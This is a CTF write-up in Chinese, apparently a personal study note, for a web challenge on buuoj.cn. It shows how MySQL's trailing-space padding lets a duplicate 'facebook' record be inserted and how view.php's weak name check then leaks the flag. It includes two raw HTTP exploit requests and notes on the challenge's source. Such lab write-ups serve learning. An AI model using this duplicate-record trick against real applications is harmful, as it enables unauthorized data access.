tags:: [[CTFWEB/SQL]]

- # mysql的缺陷
	- 如果插入的字符串不够长，mysql会在尾部添加空格。
	- 也就是说，如果我们插入一条开头为`facebook`，末尾有很多空格的记录，就可以伪装成facebook的记录
- # view.php的缺陷
	- 如果数据库中有两条名字相同的记录，我们可以通过提交第二条记录的secret绕过检测，读取第一条记录
- # 完整思路
	- 利用mysql的缺陷插入另外一条facebook记录
	- 利用view.php的检查缺陷读取facebook记录，拿到flag
- # payload
	- 第一次
		- ```http
		  POST /add.php HTTP/1.1
		  Host: 05a44e32-81cf-4aef-ba17-faf4ec5f9e3c.node4.buuoj.cn:81
		  Content-Length: 108
		  Cache-Control: max-age=0
		  Upgrade-Insecure-Requests: 1
		  Origin: http://05a44e32-81cf-4aef-ba17-faf4ec5f9e3c.node4.buuoj.cn:81
		  Content-Type: application/x-www-form-urlencoded
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
		  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
		  Referer: http://05a44e32-81cf-4aef-ba17-faf4ec5f9e3c.node4.buuoj.cn:81/add.php
		  Accept-Encoding: gzip, deflate
		  Accept-Language: zh-CN,zh;q=0.9
		  Connection: close
		  
		  name=facebook++++++++++++++++++++++++++++++++++++++++++++++++++++++++&secret=FacebookFacebook1&description=1
		  ```
	- 第二次
		- ```http
		  POST /view.php HTTP/1.1
		  Host: 05a44e32-81cf-4aef-ba17-faf4ec5f9e3c.node4.buuoj.cn:81
		  Content-Length: 38
		  Cache-Control: max-age=0
		  Upgrade-Insecure-Requests: 1
		  Origin: http://05a44e32-81cf-4aef-ba17-faf4ec5f9e3c.node4.buuoj.cn:81
		  Content-Type: application/x-www-form-urlencoded
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
		  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
		  Referer: http://05a44e32-81cf-4aef-ba17-faf4ec5f9e3c.node4.buuoj.cn:81/view.php
		  Accept-Encoding: gzip, deflate
		  Accept-Language: zh-CN,zh;q=0.9
		  Connection: close
		  
		  name=facebook&secret=FacebookFacebook1
		  ```
- # 施工记录
	- `db.php`
		- ```sql
		  INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
		  INSERT INTO products VALUES('messenger', sha256(....), ....);
		  INSERT INTO products VALUES('instagram', sha256(....), ....);
		  INSERT INTO products VALUES('whatsapp', sha256(....), ....);
		  INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
		  ```
		- 提示flag在数据库中，数据库查询做了参数化查询，无法SQL注入
		- 需要触发`get_product("facebook")`才可以获取flag
		- `check_name_secret`只要有名字相同的记录就可以绕过
		- 所有函数都没有检查是否是字符串
			- 传入数组会变成`Array`字符串
	- `add.php`
		- 含有`get_product`触发点，但不会返回结果
		- 只要能绕过`get_product`就可以插入同名记录
			- ^^字符串截断？^^
	- `view.php`
		- 含有`get_product`触发点
			- 触发条件是通过`check_name_secret`
	- `index.php`
		- 会显示数据库中的前5个结果
		- facebook在最下面
-
-
-